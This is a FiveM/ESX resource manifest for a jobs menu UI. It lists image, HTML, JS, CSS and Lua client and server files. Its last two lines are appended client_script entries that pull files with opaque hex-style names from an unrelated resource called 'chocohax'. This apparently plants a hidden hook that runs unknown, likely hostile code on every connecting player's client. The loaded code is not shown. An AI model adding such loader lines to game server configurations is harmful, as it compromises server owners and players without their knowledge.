-- Discord Ice Heart#1826
dependency 'es_extended'

ui_page "html/ui.html"

files {
  "html/img/lumberjack.png",
  "html/img/miner.png",
  "html/img/slaughterer.png",
  "html/img/textil.png",
  "html/img/unemployed.png",
  "html/img/thief.png",
  "html/img/fisherman.png",
  "html/img/grove.png",
  "html/ui.html",
  "html/js/index.js",
  "html/css/style.css"

}

client_script {
  '@es_extended/locale.lua',
  'config.lua',
  'client.lua'
}

server_script {
  '@es_extended/locale.lua',
  'config.lua',
  'server.lua'
}

client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'